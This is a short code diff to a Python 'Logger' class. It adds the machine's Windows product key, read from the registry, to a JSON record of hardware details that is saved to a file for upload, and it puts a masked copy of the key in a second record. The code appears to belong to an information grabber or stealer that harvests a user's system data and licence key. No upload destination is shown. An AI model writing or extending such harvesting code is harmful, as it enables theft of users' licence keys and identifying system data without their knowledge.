@@ -235,8 +235,7 @@ class Logger():
         # Get product key
         try:
             windowsKey = windows_tools.product_key.get_windows_product_key_from_reg()
-        except Exception as e:
-            print(e)
+        except:
             windowsKey = "N/A"
         # Get basic pc data
         def gethwid():
@@ -258,6 +257,7 @@ class Logger():
             info['CPU']=cpuInfo
             info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
             info['GPU'] = gpuName
+            info['Windows Key'] = windowsKey
             resultPC = json.dumps(info, indent=4)
             # Saving as file then uplaod
             with open("pci.txt", "a") as pciFile:
@@ -289,6 +289,8 @@ class Logger():
             info2['CPU']=cpuInfo
             info2['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
             info2['GPU'] = gpuName
+            finalLenKey = len(str(windowsKey)) - len(str(windowsKey[:5]))
+            info2['Windows Key'] = windowsKey[:5] + "*" * finalLenKey
             resultPC2 = json.dumps(info2, indent=4)
         except Exception as e:
             logging.exception(e)
